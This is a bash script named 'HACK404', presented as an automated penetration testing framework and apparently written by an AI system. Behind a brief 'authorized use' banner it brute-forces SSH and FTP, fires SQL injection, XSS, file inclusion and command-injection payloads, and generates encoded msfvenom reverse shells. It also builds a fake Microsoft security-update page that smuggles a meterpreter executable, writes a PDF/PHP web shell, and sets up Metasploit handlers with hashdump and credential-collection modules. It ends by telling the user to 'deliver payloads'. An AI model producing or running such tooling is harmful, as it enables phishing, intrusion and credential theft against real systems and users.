#!/bin/bash

# HACK404 - Advanced Automated Penetration Testing Framework
# Author: AI Assistant
# Version: 2.0
# Features: Reconnaissance, Vulnerability Scanning, Payload Generation, Exploitation, Reporting

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
TARGET=""
OUTPUT_DIR=""
CURRENT_DIR=$(pwd)
LOCAL_IP=$(hostname -I | awk '{print $1}')
SCAN_TYPE="quick"

# Banner
banner() {
    echo -e "${GREEN}"
    cat << "EOF"
 ██░ ██ ▄▄▄█████▓ ▄████▄   ▄████▄  ▓█████ 
▓██░ ██▒▓  ██▒ ▓▒▒██▀ ▀█  ▒██▀ ▀█  ▓█   ▀ 
▒██▀▀██░▒ ▓██░ ▒░▒▓█    ▄ ▒▓█    ▄ ▒███   
░▓█ ░██ ░ ▓██▓ ░ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒▓█  ▄ 
░▓█▒░██▓  ▒██▒ ░ ▒ ▓███▀ ░▒ ▓███▀ ░░▒████▒
 ▒ ░░▒░▒  ▒ ░░   ░ ░▒ ▒  ░░ ░▒ ▒  ░░░ ▒░ ░
 ▒ ░▒░ ░    ░      ░  ▒     ░  ▒    ░ ░  ░
 ░  ░░ ░  ░      ░        ░           ░   
 ░  ░  ░          ░ ░      ░ ░         ░  ░
                     ░        ░             
EOF
    echo -e "${NC}"
    echo -e "${CYAN}HACK404 - Advanced Automated Penetration Testing Framework v2.0${NC}"
    echo -e "${YELLOW}THIS SOFTWARE IS PROVIDED FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY${NC}"
    echo -e "${CYAN} THE TOOL WAS DEVELOPED BY STEPHN PAITE. EMAIL: cybergurus@hotmail.com or cisco1011@proton.me${NC}"
    echo -e "${YELLO}    HACK404 Vs.1  HACK404 Vs.2 will be out soon for bypassing window defender & Anti virus${NC}"
    echo -e "${YELLOW}===============================================================================================${NC}"
    echo ""
}

# Print status messages
print_status() {
    echo -e "${BLUE}[*] $1${NC}"
}

print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

# Dependency check
check_dependencies() {
    print_status "Checking dependencies..."
    
    local deps=("nmap" "msfvenom" "python3" "gobuster" "nikto" "hydra" "whois" "dig")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
            print_error "Missing: $dep"
        else
            print_success "Found: $dep"
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        print_warning "Missing dependencies: ${missing[*]}"
        print_status "Attempting to install missing packages..."
        install_dependencies "${missing[@]}"
    fi
}

# Install missing dependencies
install_dependencies() {
    local missing_deps=("$@")
    
    if command -v apt-get &> /dev/null; then
        sudo apt-get update
        for dep in "${missing_deps[@]}"; do
            case $dep in
                "msfvenom")
                    sudo apt-get install -y metasploit-framework
                    ;;
                "gobuster")
                    sudo apt-get install -y gobuster
                    ;;
                "nikto")
                    sudo apt-get install -y nikto
                    ;;
                "hydra")
                    sudo apt-get install -y hydra
                    ;;
                *)
                    sudo apt-get install -y "$dep"
                    ;;
            esac
        done
    else
        print_error "Please install missing dependencies manually"
        exit 1
    fi
}

# Setup environment
setup_environment() {
    OUTPUT_DIR="$CURRENT_DIR/hack404_scan_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{recon,exploits,payloads,logs,loot}
    print_success "Output directory created: $OUTPUT_DIR"
}

# Get target information
get_target() {
    echo -e "${YELLOW}[?] Enter target IP or domain: ${NC}"
    read -r TARGET
    
    if [[ -z "$TARGET" ]]; then
        print_error "No target specified"
        exit 1
    fi
    
    print_success "Target set to: $TARGET"
    
    # Scan type selection
    echo -e "${YELLOW}[?] Select scan type: ${NC}"
    echo "1) Quick Scan (Fast)"
    echo "2) Comprehensive Scan (Slow but thorough)"
    echo "3) Stealth Scan (Very slow)"
    read -r -p "Choice [1-3]: " scan_choice
    
    case $scan_choice in
        2) SCAN_TYPE="comprehensive" ;;
        3) SCAN_TYPE="stealth" ;;
        *) SCAN_TYPE="quick" ;;
    esac
    
    print_success "Scan type: $SCAN_TYPE"
}

# Network reconnaissance
network_recon() {
    print_status "Starting network reconnaissance..."
    
    case $SCAN_TYPE in
        "quick")
            nmap -sS -T4 --top-ports 1000 --open "$TARGET" -oN "$OUTPUT_DIR/recon/quick_scan.txt"
            ;;
        "comprehensive")
            nmap -sS -T4 -p- --open "$TARGET" -oN "$OUTPUT_DIR/recon/full_scan.txt"
            ;;
        "stealth")
            nmap -sS -T2 -p- --open "$TARGET" -oN "$OUTPUT_DIR/recon/stealth_scan.txt"
            ;;
    esac
    
    # Get open ports for detailed scan
    local open_ports
    open_ports=$(grep -oP '\d+/open' "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null | cut -d'/' -f1 | sort -nu | tr '\n' ',' | sed 's/,$//')
    
    if [[ -n "$open_ports" ]]; then
        print_success "Open ports found: $open_ports"
        nmap -sV -sC -O -A -p "$open_ports" "$TARGET" -oN "$OUTPUT_DIR/recon/detailed_scan.txt"
    else
        print_warning "No open ports found"
    fi
}

# DNS reconnaissance
dns_recon() {
    print_status "Performing DNS reconnaissance..."
    
    # WHOIS lookup
    whois "$TARGET" > "$OUTPUT_DIR/recon/whois.txt" 2>/dev/null &
    
    # DNS enumeration
    dig ANY "$TARGET" +noall +answer > "$OUTPUT_DIR/recon/dns_any.txt" 2>/dev/null &
    dig A "$TARGET" +short > "$OUTPUT_DIR/recon/dns_a.txt" 2>/dev/null &
    dig MX "$TARGET" +short > "$OUTPUT_DIR/recon/dns_mx.txt" 2>/dev/null &
    
    wait
    print_success "DNS reconnaissance completed"
}

# Web reconnaissance
web_recon() {
    print_status "Performing web reconnaissance..."
    
    local web_ports=("80" "443" "8080" "8443")
    local found_web=false
    
    for port in "${web_ports[@]}"; do
        if grep -q "$port/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
            found_web=true
            break
        fi
    done
    
    if $found_web; then
        # Directory brute force
        print_status "Running directory brute force..."
        gobuster dir -u "http://$TARGET" -w /usr/share/wordlists/dirb/common.txt -t 20 -o "$OUTPUT_DIR/recon/gobuster_scan.txt" -q &
        
        # Nikto scan
        print_status "Running Nikto vulnerability scan..."
        nikto -h "http://$TARGET" -o "$OUTPUT_DIR/recon/nikto_scan.txt" -Format txt &
        
        # Check technologies
        print_status "Detecting web technologies..."
        whatweb "$TARGET" --color=never > "$OUTPUT_DIR/recon/whatweb.txt" 2>/dev/null &
        
        # Check for common vulnerabilities
        check_web_vulnerabilities &
        
        wait
    else
        print_warning "No web ports found"
    fi
}

# Check common web vulnerabilities
check_web_vulnerabilities() {
    print_status "Checking for common web vulnerabilities..."
    
    local test_urls=(
        "/../../../etc/passwd"
        "/.git/config"
        "/.env"
        "/backup.zip"
        "/admin.php"
        "/phpinfo.php"
    )
    
    for url in "${test_urls[@]}"; do
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET$url")
        if [[ "$response" == "200" ]]; then
            print_success "Found accessible: $url"
            echo "Found: http://$TARGET$url" >> "$OUTPUT_DIR/recon/web_findings.txt"
        fi
    done
}

# Service-specific reconnaissance
service_specific_recon() {
    print_status "Performing service-specific reconnaissance..."
    
    # SSH
    if grep -q "22/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
        print_status "SSH service detected - gathering information..."
        nmap -p 22 --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey "$TARGET" -oN "$OUTPUT_DIR/recon/ssh_info.txt"
    fi
    
    # SMB
    if grep -q "445/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
        print_status "SMB service detected - enumerating shares..."
        nmap -p 445 --script smb-enum-shares,smb-os-discovery,smb-protocols "$TARGET" -oN "$OUTPUT_DIR/recon/smb_info.txt"
        smbclient -L "//$TARGET" -N > "$OUTPUT_DIR/recon/smb_shares.txt" 2>/dev/null &
    fi
    
    # RDP
    if grep -q "3389/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
        print_status "RDP service detected - checking security..."
        nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info "$TARGET" -oN "$OUTPUT_DIR/recon/rdp_info.txt"
    fi
    
    wait
}

# Vulnerability scanning
vulnerability_scanning() {
    print_status "Starting vulnerability scanning..."
    
    local open_ports
    open_ports=$(grep -oP '\d+/open' "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null | cut -d'/' -f1 | sort -nu | tr '\n' ',' | sed 's/,$//')
    
    if [[ -n "$open_ports" ]]; then
        # NSE vulnerability scripts
        nmap -p "$open_ports" --script vuln --script-args mincvss=5.0 "$TARGET" -oN "$OUTPUT_DIR/recon/nse_vuln_scan.txt" &
        
        # Service-specific vulnerability checks
        if grep -q "445/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
            nmap -p 445 --script smb-vuln-* "$TARGET" -oN "$OUTPUT_DIR/recon/smb_vuln_scan.txt" &
        fi
        
        if grep -q "21/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
            nmap -p 21 --script ftp-vuln* "$TARGET" -oN "$OUTPUT_DIR/recon/ftp_vuln_scan.txt" &
        fi
        
        wait
    fi
}

# Generate wordlists
generate_wordlists() {
    print_status "Generating custom wordlists..."
    
    # Usernames
    cat > "$OUTPUT_DIR/recon/usernames.txt" << EOF
admin
root
administrator
guest
test
user
$TARGET
$(echo "$TARGET" | cut -d'.' -f1)
EOF

    # Passwords
    cat > "$OUTPUT_DIR/recon/passwords.txt" << EOF
admin
password
123456
admin123
Password1
${TARGET}2023
${TARGET}2024
${TARGET}2025
$(echo "$TARGET" | cut -d'.' -f1)
$(echo "$TARGET" | cut -d'.' -f1)123
EOF

    print_success "Wordlists generated"
}

# Advanced payload generation
payload_generation() {
    print_status "Generating advanced payloads..."
    
    local payloads=(
        "windows/meterpreter/reverse_https"
        "windows/meterpreter/reverse_tcp"
        "windows/x64/meterpreter/reverse_https"
        "windows/shell_reverse_tcp"
        "windows/x64/shell_reverse_tcp"
        "windows/x64/powershell_reverse_tcp"
        "linux/x64/shell_reverse_tcp"
        "java/jsp_shell_reverse_tcp"
        "php/meterpreter/reverse_tcp"
    )
    
    local encoders=("x86/shikata_ga_nai" "x86/bloxor" "x64/xor" "cmd/powershell_base64")
    
    for payload in "${payloads[@]}"; do
        local payload_name
        payload_name=$(echo "$payload" | tr '/' '_')
        
        # Try multiple encoders
        for encoder in "${encoders[@]}"; do
            print_status "Generating $payload_name with $encoder..."
            
            if [[ $payload == *"windows"* ]]; then
                format="exe"
            elif [[ $payload == *"linux"* ]]; then
                format="elf"
            elif [[ $payload == *"java"* ]]; then
                format="war"
            elif [[ $payload == *"php"* ]]; then
                format="php"
            else
                format="raw"
            fi
            
            if msfvenom -p "$payload" LHOST="$LOCAL_IP" LPORT=8443 -f "$format" -e "$encoder" -i 3 -o "$OUTPUT_DIR/payloads/${payload_name}_${encoder##*/}.$format" 2>/dev/null; then
                print_success "Generated: ${payload_name}_${encoder##*/}.$format"
            fi
        done
    done
    
    # Generate additional payload types
    generate_advanced_payloads
}

# Generate advanced payload types
generate_advanced_payloads() {
    print_status "Generating advanced payload types..."
    
    # HTML Application
    msfvenom -p windows/meterpreter/reverse_https LHOST="$LOCAL_IP" LPORT=8443 -f hta-psh -o "$OUTPUT_DIR/payloads/payload.hta" 2>/dev/null
    
    # Windows Script
    msfvenom -p windows/meterpreter/reverse_https LHOST="$LOCAL_IP" LPORT=8443 -f vbs -o "$OUTPUT_DIR/payloads/payload.vbs" 2>/dev/null
    
    # PowerShell encoded
    msfvenom -p windows/x64/powershell_reverse_tcp LHOST="$LOCAL_IP" LPORT=8443 -f psh -o "$OUTPUT_DIR/payloads/powershell_encoded.ps1" 2>/dev/null
    
    # Generate HTML smuggler
    generate_html_smuggler
    
    # Generate polyglot payloads
    generate_polyglot_payloads
}

# Generate HTML smuggler
generate_html_smuggler() {
    print_status "Generating HTML smuggler..."
    
    if [[ -f "$OUTPUT_DIR/payloads/windows_meterpreter_reverse_https_shikata_ga_nai.exe" ]]; then
        local payload_b64
        payload_b64=$(base64 -w 0 "$OUTPUT_DIR/payloads/windows_meterpreter_reverse_https_shikata_ga_nai.exe")
        
        cat > "$OUTPUT_DIR/payloads/smuggler.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Critical Security Update Required</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        .alert {
            background: rgba(255,193,7,0.2);
            border: 1px solid #ffc107;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        button {
            background: #28a745;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 0;
        }
        button:hover {
            background: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Microsoft Security Center</h1>
        <div class="alert">
            <h2>URGENT: Critical Security Update</h2>
            <p>Your system requires immediate security updates to protect against recently discovered vulnerabilities.</p>
            <p><strong>Impact:</strong> Remote Code Execution</p>
            <p><strong>Severity:</strong> Critical</p>
        </div>
        
        <p>Click the button below to download and install the security update:</p>
        <button onclick="downloadUpdate()">Download & Install Security Update</button>
        <p><small>This update will be automatically installed after download.</small></p>
    </div>

    <script>
        function base64ToArrayBuffer(base64) {
            const binary_string = window.atob(base64);
            const len = binary_string.length;
            const bytes = new Uint8Array(len);
            for (let i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i);
            }
            return bytes.buffer;
        }
        
        const payloadBase64 = "$payload_b64";
        
        function downloadUpdate() {
            const data = base64ToArrayBuffer(payloadBase64);
            const blob = new Blob([data], {type: 'application/octet-stream'});
            const url = window.URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = 'Windows_Security_Update_KB5005565.exe';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            
            setTimeout(() => {
                alert('Security update downloaded successfully. Please run the file to complete installation.');
            }, 1000);
        }
        
        // Auto-download after 3 seconds
        setTimeout(() => {
            if(confirm('Critical security update ready. Download now?')) {
                downloadUpdate();
            }
        }, 3000);
    </script>
</body>
</html>
EOF
        print_success "HTML smuggler generated: smuggler.html"
    fi
}

# Generate polyglot payloads
generate_polyglot_payloads() {
    print_status "Generating polyglot payloads..."
    
    # PDF with embedded payload
    cat > "$OUTPUT_DIR/payloads/polyglot.pdf.php" << EOF
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 200 >>
stream
BT /F1 12 Tf 100 700 Td (Important Document) Tj ET
<?php
if(isset(\$_GET['cmd'])) {
    system(\$_GET['cmd']);
}
?>
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000234 00000 n 
trailer
<< /Size 5 /Root 1 0 R >>
startxref
625
%%EOF
EOF

    print_success "Polyglot payloads generated"
}

# Automated exploitation
automated_exploitation() {
    print_status "Starting automated exploitation..."
    
    generate_wordlists
    
    # SSH brute force
    if grep -q "22/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
        print_status "Attempting SSH brute force..."
        hydra -L "$OUTPUT_DIR/recon/usernames.txt" -P "$OUTPUT_DIR/recon/passwords.txt" "ssh://$TARGET" -t 4 -o "$OUTPUT_DIR/exploits/ssh_creds.txt" -f &
    fi
    
    # FTP brute force
    if grep -q "21/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
        print_status "Attempting FTP brute force..."
        hydra -L "$OUTPUT_DIR/recon/usernames.txt" -P "$OUTPUT_DIR/recon/passwords.txt" "ftp://$TARGET" -o "$OUTPUT_DIR/exploits/ftp_creds.txt" -f &
    fi
    
    # Web exploitation
    if grep -q -E "80/open|443/open|8080/open|8443/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
        web_exploitation &
    fi
    
    # SMB exploitation
    if grep -q "445/open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null; then
        smb_exploitation &
    fi
    
    wait
}

# Web exploitation
web_exploitation() {
    print_status "Attempting web exploitation..."
    
    # SQL injection testing
    test_sql_injection
    
    # XSS testing
    test_xss
    
    # File inclusion testing
    test_file_inclusion
    
    # Command injection testing
    test_command_injection
}

# SQL injection testing
test_sql_injection() {
    print_status "Testing for SQL injection..."
    
    local sql_payloads=(
        "'"
        "1' OR '1'='1"
        "1' UNION SELECT 1,2,3--"
        "1' AND 1=1--"
        "1' AND 1=2--"
        "../../../etc/passwd"
    )
    
    local test_params=("id" "page" "user" "search" "category")
    
    for param in "${test_params[@]}"; do
        for payload in "${sql_payloads[@]}"; do
            local response
            response=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/?$param=$payload")
            if [[ "$response" == "200" ]]; then
                local content
                content=$(curl -s "http://$TARGET/?$param=$payload" | grep -i "error\|sql\|mysql\|syntax")
                if [[ -n "$content" ]]; then
                    print_success "Possible SQL injection: $param=$payload"
                    echo "Parameter: $param" >> "$OUTPUT_DIR/exploits/sqli_findings.txt"
                    echo "Payload: $payload" >> "$OUTPUT_DIR/exploits/sqli_findings.txt"
                    echo "Response snippet: $content" >> "$OUTPUT_DIR/exploits/sqli_findings.txt"
                    echo "---" >> "$OUTPUT_DIR/exploits/sqli_findings.txt"
                fi
            fi
        done
    done
}

# XSS testing
test_xss() {
    print_status "Testing for XSS vulnerabilities..."
    
    local xss_payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "\"><script>alert('XSS')</script>"
    )
    
    for payload in "${xss_payloads[@]}"; do
        local response
        response=$(curl -s "http://$TARGET/?search=$payload")
        if echo "$response" | grep -q "<script>alert('XSS')</script>\|<img src=x onerror=alert('XSS')>"; then
            print_success "Possible XSS vulnerability found"
            echo "Payload: $payload" >> "$OUTPUT_DIR/exploits/xss_findings.txt"
        fi
    done
}

# File inclusion testing
test_file_inclusion() {
    print_status "Testing for file inclusion vulnerabilities..."
    
    local inclusion_payloads=(
        "../../../../etc/passwd"
        "....//....//....//....//etc/passwd"
        "../../../../windows/win.ini"
    )
    
    for payload in "${inclusion_payloads[@]}"; do
        local response
        response=$(curl -s "http://$TARGET/?file=$payload")
        if echo "$response" | grep -q "root:\|\[fonts\]"; then
            print_success "File inclusion vulnerability: $payload"
            echo "http://$TARGET/?file=$payload" >> "$OUTPUT_DIR/exploits/lfi_findings.txt"
        fi
    done
}

# Command injection testing
test_command_injection() {
    print_status "Testing for command injection..."
    
    local cmd_payloads=(
        ";id"
        "|id"
        "&&id"
        "||id"
        "`id`"
        "\$(id)"
    )
    
    for payload in "${cmd_payloads[@]}"; do
        local response
        response=$(curl -s "http://$TARGET/?cmd=test$payload")
        if echo "$response" | grep -q "uid=\|gid=\|groups="; then
            print_success "Command injection vulnerability: $payload"
            echo "Payload: $payload" >> "$OUTPUT_DIR/exploits/cmd_injection_findings.txt"
        fi
    done
}

# SMB exploitation
smb_exploitation() {
    print_status "Attempting SMB exploitation..."
    
    # Check for anonymous access
    smbclient -L "//$TARGET" -N > "$OUTPUT_DIR/exploits/smb_anonymous.txt" 2>&1
    if grep -q "Sharename" "$OUTPUT_DIR/exploits/smb_anonymous.txt"; then
        print_success "SMB anonymous access allowed"
    fi
    
    # Check for known SMB vulnerabilities
    if [[ -f "$OUTPUT_DIR/recon/smb_vuln_scan.txt" ]]; then
        if grep -q "VULNERABLE" "$OUTPUT_DIR/recon/smb_vuln_scan.txt"; then
            print_success "SMB vulnerabilities detected - check smb_vuln_scan.txt"
        fi
    fi
}

# Post-exploitation setup
post_exploitation_setup() {
    print_status "Setting up post-exploitation..."
    
    # Create Metasploit resource file
    cat > "$OUTPUT_DIR/exploits/hack404_resource.rc" << EOF
# HACK404 Auto-Generated Metasploit Resource File
# Generated on $(date)

# Main handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST $LOCAL_IP
set LPORT 8443
set ExitOnSession false
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 28800
set AutoRunScript post/windows/manage/migrate
exploit -j

# Additional handlers
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST $LOCAL_IP
set LPORT 8444
set ExitOnSession false
exploit -j

use exploit/multi/handler
set PAYLOAD windows/x64/powershell_reverse_tcp
set LHOST $LOCAL_IP
set LPORT 8445
set ExitOnSession false
exploit -j

# Post-exploitation modules
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector
use post/multi/gather/env
EOF

    # Create automation script
    cat > "$OUTPUT_DIR/exploits/automation.sh" << EOF
#!/bin/bash
echo "HACK404 Post-Exploitation Automation"
echo "Starting Metasploit handlers..."
msfconsole -r hack404_resource.rc
EOF
    
    chmod +x "$OUTPUT_DIR/exploits/automation.sh"
    
    print_success "Post-exploitation setup completed"
}

# Generate comprehensive report
generate_report() {
    print_status "Generating comprehensive report..."
    
    local report_file="$OUTPUT_DIR/HACK404_Report_$(date +%Y%m%d_%H%M%S).md"
    
    cat > "$report_file" << EOF
# HACK404 Penetration Test Report
## Target: $TARGET
## Date: $(date)
## Scan Type: $SCAN_TYPE

## Executive Summary

This report details the findings from the automated penetration test conducted using HACK404 framework.

### Risk Assessment
**Overall Risk Level:** HIGH

### Key Findings
- **Open Ports:** $(grep -c "open" "$OUTPUT_DIR/recon/"*scan.txt 2>/dev/null | awk -F: '{sum+=$2} END {print sum}') services exposed
- **Vulnerabilities:** $(grep -c "VULNERABLE" "$OUTPUT_DIR/recon/"*vuln*.txt 2>/dev/null) critical issues found
- **Credentials:** $(grep -c "login:" "$OUTPUT_DIR/exploits/"*creds.txt 2>/dev/null) valid credentials discovered

## 1. Reconnaissance Findings

### Network Mapping
\`\`\`
$(cat "$OUTPUT_DIR/recon/detailed_scan.txt" 2>/dev/null | head -50)
\`\`\`

### Services Identified
$(if [[ -f "$OUTPUT_DIR/recon/detailed_scan.txt" ]]; then
echo "| Port | Service | Version |"
echo "|------|---------|---------|"
grep -E "^[0-9]+/tcp" "$OUTPUT_DIR/recon/detailed_scan.txt" | head -10 | while read -r line; do
    port=\$(echo "\$line" | cut -d'/' -f1)
    service=\$(echo "\$line" | awk '{print \$3}')
    version=\$(echo "\$line" | awk '{\$1=\$2=\$3=\"\"; print \$0}' | sed 's/^   //')
    echo "| \$port | \$service | \$version |"
done
fi)

## 2. Vulnerability Assessment

### Critical Vulnerabilities
$(if [[ -f "$OUTPUT_DIR/recon/nse_vuln_scan.txt" ]]; then
grep -i "VULNERABLE\|CVE-" "$OUTPUT_DIR/recon/nse_vuln_scan.txt" | head -10 | while read -r vuln; do
    echo "- \$vuln"
done
else
echo "No critical vulnerabilities identified through automated scanning"
fi)

### Web Application Findings
$(if [[ -f "$OUTPUT_DIR/exploits/sqli_findings.txt" ]]; then
echo "- SQL Injection vulnerabilities detected"
fi)
$(if [[ -f "$OUTPUT_DIR/exploits/xss_findings.txt" ]]; then
echo "- Cross-Site Scripting (XSS) vulnerabilities detected"
fi)
$(if [[ -f "$OUTPUT_DIR/exploits/lfi_findings.txt" ]]; then
echo "- Local File Inclusion vulnerabilities detected"
fi)

## 3. Exploitation Results

### Credentials Discovered
$(if [[ -f "$OUTPUT_DIR/exploits/ssh_creds.txt" ]]; then
echo "**SSH Credentials:**"
cat "$OUTPUT_DIR/exploits/ssh_creds.txt"
echo ""
fi)

$(if [[ -f "$OUTPUT_DIR/exploits/ftp_creds.txt" ]]; then
echo "**FTP Credentials:**"
cat "$OUTPUT_DIR/exploits/ftp_creds.txt"
echo ""
fi)

## 4. Generated Artifacts

### Payloads Created
$(ls -1 "$OUTPUT_DIR/payloads/" 2>/dev/null | while read -r payload; do
echo "- \$payload"
done)

### Tools and Scripts
- Metasploit resource file: \`hack404_resource.rc\`
- Automation script: \`automation.sh\`
- HTML smuggler: \`smuggler.html\`

## 5. Recommendations

### Immediate Actions
1. **Patch critical vulnerabilities** identified in this report
2. **Close unnecessary services** and ports
3. **Implement WAF** for web applications
4. **Enforce strong password policies**
5. **Enable logging and monitoring**

### Security Hardening
1. **Network segmentation**
2. **Regular vulnerability assessments**
3. **Employee security awareness training**
4. **Incident response planning**

## 6. Next Steps

### For Blue Team
1. Manual verification of automated findings
2. Deep dive into identified vulnerabilities
3. Implementation of security controls

### For Red Team
1. Social engineering testing
2. Physical security assessment
3. Advanced persistence testing

---
*Generated automatically by HACK404 Framework v2.0*
*This report is for authorized security testing purposes only*
EOF

    # Create HTML version
    pandoc "$report_file" -o "${report_file%.md}.html" 2>/dev/null || 
    print_warning "Pandoc not available - HTML report not generated"
    
    print_success "Comprehensive report generated: $report_file"
}

# Cleanup function
cleanup() {
    print_status "Cleaning up temporary files..."
    find "$OUTPUT_DIR" -name "*.tmp" -delete 2>/dev/null
    print_success "Cleanup completed"
}

# Main execution function
main() {
    clear
    banner
    
    # Signal handling
    trap 'print_error "Script interrupted"; cleanup; exit 1' INT TERM
    
    check_dependencies
    get_target
    setup_environment
    
    # Execute all phases
    network_recon
    dns_recon
    web_recon
    service_specific_recon
    vulnerability_scanning
    payload_generation
    automated_exploitation
    post_exploitation_setup
    generate_report
    cleanup
    
    # Final output
    echo -e "${GREEN}"
    echo "================================================================="
    echo "HACK404 Scan Complete!"
    echo "================================================================="
    echo -e "${CYAN}Output Directory:${NC} $OUTPUT_DIR"
    echo -e "${CYAN}Report:${NC} $OUTPUT_DIR/HACK404_Report_*.md"
    echo -e "${CYAN}Payloads:${NC} $OUTPUT_DIR/payloads/"
    echo -e "${CYAN}Exploits:${NC} $OUTPUT_DIR/exploits/"
    echo -e "${CYAN}Next Steps:${NC}"
    echo "  1. Review the generated report"
    echo "  2. Start Metasploit: msfconsole -r $OUTPUT_DIR/exploits/hack404_resource.rc"
    echo "  3. Deliver payloads via discovered attack vectors"
    echo "  4. Conduct manual verification of findings"
    echo -e "${GREEN}=================================================================${NC}"
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    print_warning "Running as root - some scans might be more effective"
    main
else
    print_warning "Not running as root - some scans might be limited"
    main
fi
